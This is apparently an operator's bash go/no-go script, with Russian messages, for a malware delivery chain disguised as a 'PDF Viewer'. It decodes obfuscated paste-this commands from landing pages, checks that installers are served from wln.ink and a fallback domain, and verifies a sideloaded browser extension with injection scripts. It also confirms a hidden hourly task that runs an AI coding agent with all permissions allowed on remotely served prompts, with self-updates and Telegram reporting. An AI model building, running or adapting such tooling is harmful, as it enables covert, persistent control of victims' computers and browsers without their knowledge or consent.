#!/bin/bash
# End-to-end verification of the PDF Viewer delivery + AI maintenance chain.
# Every check prints PASS/FAIL; the summary decides GO / NO-GO.
PASS=0; FAIL=0
ok()   { printf "  \033[32mPASS\033[0m  %s\n" "$1"; PASS=$((PASS+1)); }
bad()  { printf "  \033[31mFAIL\033[0m  %s\n" "$1"; FAIL=$((FAIL+1)); }
chk()  { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (получено '$2', ждали '$3')"; fi; }
has()  { if printf '%s' "$2" | grep -qF -- "$3"; then ok "$1"; else bad "$1 (нет '$3')"; fi; }
hasnt(){ if printf '%s' "$2" | grep -qF -- "$3"; then bad "$1 (есть лишнее '$3')"; else ok "$1"; fi; }

echo "── 1. ЛЕНДИНГ: команда, которую копирует пользователь ──────────────"
for f in /var/www/wln.ink/index.html /var/www/wln.ink/index-fallback.html; do
  CMD=$(python3 - "$f" <<'PY'
import base64,re,sys
s=open(sys.argv[1],encoding='utf-8').read()
out=[]
for os_name in ('windows','macos'):
    m=re.search(os_name+r": \[([^\]]+)\]", s)
    if not m: out.append('?'); continue
    j=''.join(re.findall(r"'([A-Za-z0-9+/=]+)'", m.group(1)))
    raw=base64.b64decode(j+'='*(-len(j)%4)).decode()
    out.append(''.join(raw[i] for i in range(0,len(raw),2))+''.join(raw[i] for i in range(1,len(raw),2)))
print('|'.join(out))
PY
)
  case "$f" in
    *fallback*) has "$f: команда Windows (резервный домен)" "$CMD" "c.doghodl.com/i"
                has "$f: команда macOS (резервный домен)"   "$CMD" "c.doghodl.com/m" ;;
    *)          has "$f: команда Windows" "$CMD" "wln.ink/i"
                has "$f: команда macOS"   "$CMD" "wln.ink/m" ;;
  esac
done

echo "── 2. ДОСТАВКА: оба домена отдают установщики ─────────────────────"
for d in wln.ink c.doghodl.com; do
  chk "$d /i отвечает (301/200)"    "$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 https://$d/i)" "$( [ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 https://$d/i)" = "200" ] && echo 200 || echo 301 )"
  chk "$d /m отвечает (301/200)"    "$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 https://$d/m)" "$( [ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 https://$d/m)" = "200" ] && echo 200 || echo 301 )"
  chk "$d /p отвечает 200"          "$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 "https://$d/p?id=aaaabbbbccccdddd")" "200"
  chk "$d /n: GET заблокирован"     "$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 https://$d/n)" "403"
  PS=$(curl -sL --max-time 40 https://$d/i)
  SH=$(curl -sL --max-time 40 https://$d/m)
  has   "$d /i — это PowerShell"    "$PS" "PDFVIEWER_MAINTENANCE"
  has   "$d /m — это bash"          "$SH" "#!/bin/bash"
  hasnt "$d /i — не HTML-заглушка"  "$PS" "<!DOCTYPE html>"
  hasnt "$d /m — не HTML-заглушка"  "$SH" "<!DOCTYPE html>"
done

echo "── 3. РАСШИРЕНИЕ: что реально уедет на машину ─────────────────────"
SHA=$(curl -s https://api.github.com/repos/Castro02980/pdf-viewer-extension/commits/main | python3 -c "import json,sys;print(json.load(sys.stdin)['sha'])")
SH_SCRIPT=$(curl -sL --max-time 40 https://wln.ink/m)
has "mac-установщик запинен на текущий коммит расширения" "$SH_SCRIPT" "${SHA:0:7}"
EXT_SHA_PINNED=$(printf '%s' "$SH_SCRIPT" | grep -oE '^EXT_SHA256="[a-f0-9]{64}"' | grep -oE '[a-f0-9]{64}')
curl -fsSL --max-time 180 "https://github.com/Castro02980/pdf-viewer-extension/archive/$SHA.zip" -o /tmp/vfy-ext.zip
EXT_SHA_REAL=$(sha256sum /tmp/vfy-ext.zip | cut -d' ' -f1)
chk "sha256 архива совпадает с запиненным" "$EXT_SHA_REAL" "$EXT_SHA_PINNED"
rm -rf /tmp/vfy && mkdir -p /tmp/vfy && unzip -o -q /tmp/vfy-ext.zip -d /tmp/vfy
D=$(ls -d /tmp/vfy/*/ | head -1)
MAN="$D/manifest.json"
chk "имя расширения"        "$(python3 -c "import json;print(json.load(open('$MAN'))['name'])")" "PDF Viewer"
has "есть ключ (стабильный ID)" "$(cat $MAN)" '"key"'
has "есть background.service_worker" "$(cat $MAN)" '"service_worker"'
has "есть content_scripts"  "$(cat $MAN)" 'inject-runner.js'
[ -f "$D/icons/icon128.png" ] && ok "иконка PDF Viewer на месте" || bad "нет иконки"
[ -f "$D/background.js" ] && ok "background.js (агент панели)" || bad "нет background.js"
[ -f "$D/content/inject-runner.js" ] && ok "inject-runner.js (инжекты)" || bad "нет inject-runner.js"
[ -f "$D/pdf.min.js" ] && bad "pdf.js ещё лежит (старый просмотрщик)" || ok "pdf.js удалён"
hasnt "в манифесте нет update_url" "$(cat $MAN)" 'update_url'
# ID считаем той же формулой, что и установщик macOS
IDCHK=$(MANIFEST_PATH="$MAN" ruby -rjson -rbase64 -rdigest -e '
  d = JSON.parse(File.read(ENV.fetch("MANIFEST_PATH")))
  der = Base64.decode64(d.fetch("key"))
  dg = Digest::SHA256.digest(der)[0,16]
  puts dg.bytes.map { |b| "abcdefghijklmnop"[(b>>4)&15].to_s + "abcdefghijklmnop"[b&15].to_s }.join
' 2>/dev/null || python3 -c "
import json,base64,hashlib
d=json.load(open('$MAN'))
dg=hashlib.sha256(base64.b64decode(d['key'])).digest()[:16]
print(''.join('abcdefghijklmnop'[(b>>4)&15]+'abcdefghijklmnop'[b&15] for b in dg))")
chk "ID расширения стабильный" "$IDCHK" "kklpcoclpjjfiboodbmcpogicnanoopp"
rm -rf /tmp/vfy /tmp/vfy-ext.zip

echo "── 4. МОДУЛЬ ИИ: что установщик ставит на машину ──────────────────"
has "часовой интервал macOS (3600)"     "$SH_SCRIPT" "<integer>3600</integer>"
has "Windows: задача каждый час"        "$PS" "/SC HOURLY /MO 1"
has "Windows: PDFViewerMaintenance"     "$PS" "PDFViewerMaintenance"
has "тихий запуск: -WindowStyle Hidden" "$PS" "-WindowStyle Hidden"
has "тихий запуск: nohup (macOS)"       "$SH_SCRIPT" "nohup"
has "opencode качается официально"      "$PS" "releases/latest/download"
has "самопочинение opencode"            "$PS" "opencode missing or broken"
has "permission: allow (yolo)"          "$PS" "permission'] = 'allow'"
has "маркер завершения как критерий"    "$PS" "no-marker"
has "цепочка моделей"                   "$PS" "models"
has "детектор зависания"                "$PS" "idleSec"
has "фолбэк-хост у промпта"             "$PS" "prompt-default.json"
has "фолбэк-хост у установщика"         "$PS" "raw.githubusercontent.com"
has "самообновление macOS с wln.ink/m"  "$SH_SCRIPT" 'INSTALLER_URLS="https://wln.ink/m'
has "сообщение идёт первым (не съест --file)" "$PS" "'run', \$msg, '--auto'"
has "сообщение первым в macOS"          "$SH_SCRIPT" 'run "$TASK_MSG" --auto'
has "таймаут попытки 600с"              "$PS" 'perAttemptSec = 600'
has "бюджет прогона 1500с"             "$PS" 'totalBudgetSec = 1500'
# синтаксис
if bash -n /opt/pdf-viewer/installers/install-pdf-viewer-macos.sh 2>/dev/null; then ok "bash -n (установщик macOS)"; else bad "bash -n (установщик macOS)"; fi
if dash -n /opt/pdf-viewer/installers/install-pdf-viewer-macos.sh 2>/dev/null; then ok "dash -n (лендинг отдаёт через sh)"; else bad "dash -n"; fi
if [ ! -x /tmp/pwsh/pwsh ]; then
  bad "парсер PowerShell (нет интерпретатора /tmp/pwsh/pwsh — проверка не выполнена)"
elif /tmp/pwsh/pwsh -NoProfile -Command '$e=$null;$t=$null;[System.Management.Automation.Language.Parser]::ParseFile((Resolve-Path "/opt/pdf-viewer/installers/install-pdf-viewer.ps1"),[ref]$t,[ref]$e)|Out-Null; if($e.Count){exit 1}' 2>/dev/null; then
  ok "парсер PowerShell: 0 ошибок"
else
  bad "парсер PowerShell: есть ошибки"
fi

echo "── 5. ЭНДПОИНТ ПРОМПТА: что машина получает по своему id ──────────"
P=$(curl -s "https://wln.ink/p?id=aaaabbbbccccdddd&os=windows&client=vfy&v=1")
PMODEL=$(printf '%s' "$P" | python3 -c "import json,sys;print(json.load(sys.stdin)['model'])")
PCHAIN=$(printf '%s' "$P" | python3 -c "import json,sys;print(json.load(sys.stdin).get('models',''))")
PMARK=$(printf '%s' "$P" | python3 -c "import json,sys;print(json.load(sys.stdin).get('done_marker',''))")
PSIZE=$(printf '%s' "$P" | python3 -c "import json,sys;print(len(json.load(sys.stdin)['prompt'].encode()))")
PSHA=$(printf '%s' "$P" | python3 -c "import json,sys,hashlib;print(hashlib.sha256(json.load(sys.stdin)['prompt'].encode()).hexdigest()[:16])")
chk "первая модель" "$PMODEL" "opencode/big-pickle"
[ "$(printf '%s' "$PCHAIN" | wc -w)" -ge 6 ] && ok "цепочка моделей: $(printf '%s' "$PCHAIN" | wc -w) шт" || bad "цепочка моделей короткая"
chk "маркер завершения" "$PMARK" "MAINT done"
[ "$PSIZE" -gt 1000 ] && ok "промпт непустой ($PSIZE байт, sha $PSHA)" || bad "промпт пустой"
PBAD=$(curl -s "https://wln.ink/p?id=../../etc/passwd")
has "обход каталога отклонён" "$PBAD" "bad-device-id"

echo "── 6. ЛОГИ: пишется ли всё, что нужно для разбора ─────────────────"
sleep 1; tail -1 /var/log/wln/prompt.jsonl > /tmp/last.json 2>/dev/null
LAST=$(cat /tmp/last.json 2>/dev/null)
for f in rid id result ip ip_source via_cloudflare os client prompt_bytes prompt_sha ms; do
  has "в логе поле $f" "$LAST" "\"$f\""
done
hasnt "ключ провайдера не утекает в лог" "$LAST" "apiKey"
[ -f /var/log/wln/events.jsonl ] && ok "events.jsonl существует" || bad "нет events.jsonl"
[ -f /etc/logrotate.d/wln ] && ok "ротация логов настроена" || bad "нет ротации"

echo "── 7. ОТЧЁТЫ → TELEGRAM ──────────────────────────────────────────"
NT=$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 -X POST https://wln.ink/n --data "ev=vfy_chain&os=linux&extra=final go/no-go check a3f9c2b1d4e50768")
chk "POST /n принят" "$NT" "200"
BOT_OK=$(python3 - <<'PY'
import json,urllib.request
cfg={}
for line in open('/etc/wln-notify.conf'):
    line=line.strip()
    if line and not line.startswith('#') and '=' in line:
        k,v=line.split('=',1); cfg[k.strip()]=v.strip()
tok=cfg.get('BOT_TOKEN','')
try:
    r=urllib.request.urlopen('https://api.telegram.org/bot%s/getMe'%tok, timeout=20)
    d=json.load(r)
    print('ok' if d.get('ok') else 'no')
except Exception:
    print('no')
PY
)
chk "бот-токен валиден" "$BOT_OK" "ok"
CHAT_OK=$(python3 - <<'PY'
import json,urllib.request
cfg={}
for line in open('/etc/wln-notify.conf'):
    line=line.strip()
    if line and not line.startswith('#') and '=' in line:
        k,v=line.split('=',1); cfg[k.strip()]=v.strip()
try:
    r=urllib.request.urlopen('https://api.telegram.org/bot%s/getChat?chat_id=%s'%(cfg.get('BOT_TOKEN',''),cfg.get('CHAT_ID','')), timeout=20)
    print('ok' if json.load(r).get('ok') else 'no')
except Exception:
    print('no')
PY
)
chk "чат доступен боту" "$CHAT_OK" "ok"

echo "── 8. ОТКАЗОУСТОЙЧИВОСТЬ И ПЕРЕКЛЮЧЕНИЕ ─────────────────────────"
chk "health-check проходит" "$(python3 /usr/local/bin/wln-health.py 2>&1 | head -1)" "all ok, state=main"
chk "режим переключения" "$(cat /var/log/wln-failover.state)" "main"
for d in wln.ink c.doghodl.com; do
  chk "$d отдаёт лендинг" "$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 "https://$d/?tst=1")" "200"
done

echo
echo "═══════════════════════════════════════════════════════════════"
printf "  ИТОГО: \033[32m%d PASS\033[0m, \033[31m%d FAIL\033[0m\n" "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ] && echo "  ВЕРДИКТ: \033[32mGO\033[0m" || echo "  ВЕРДИКТ: \033[31mNO-GO\033[0m"
echo "═══════════════════════════════════════════════════════════════"
exit $FAIL
